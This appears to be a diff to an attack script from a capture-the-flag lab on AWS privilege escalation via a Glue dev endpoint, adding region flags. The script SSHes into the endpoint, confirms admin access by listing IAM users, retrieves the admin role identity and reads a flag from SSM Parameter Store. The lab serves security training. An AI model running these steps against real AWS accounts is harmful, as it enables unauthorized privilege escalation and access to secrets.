@@ -269,7 +269,7 @@ echo ""
 SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30"
 
 # Execute AWS CLI command on the Glue dev endpoint and display output directly
-if ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws iam list-users --max-items 3 --output table"; then
+if ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws iam list-users --max-items 3 --region $AWS_REGION --output table"; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED via Glue Dev Endpoint${NC}"
@@ -286,7 +286,7 @@ echo -e "${YELLOW}Step 11: Extracting AWS credentials from the endpoint${NC}"
 echo "Retrieving the admin role credentials from the endpoint environment..."
 echo ""
 
-CREDS_OUTPUT=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws sts get-caller-identity --output json" 2>/dev/null)
+CREDS_OUTPUT=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws sts get-caller-identity --region $AWS_REGION --output json" 2>/dev/null)
 
 if [ $? -eq 0 ] && [ -n "$CREDS_OUTPUT" ]; then
     echo "Identity running on the endpoint:"
@@ -309,9 +309,9 @@ echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
 echo "The Glue dev endpoint runs as the admin role — using the SSH session to call ssm:GetParameter..."
 echo ""
 FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-002-to-admin"
-show_attack_cmd "Attacker (via Glue endpoint)" "ssh ... \"aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text\""
+show_attack_cmd "Attacker (via Glue endpoint)" "ssh ... \"aws ssm get-parameter --region $AWS_REGION --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text\""
 FLAG_VALUE=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" \
-    "aws ssm get-parameter --name '$FLAG_PARAM_NAME' --query 'Parameter.Value' --output text" 2>/dev/null)
+    "aws ssm get-parameter --region $AWS_REGION --name '$FLAG_PARAM_NAME' --query 'Parameter.Value' --output text" 2>/dev/null)
 
 if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
     echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
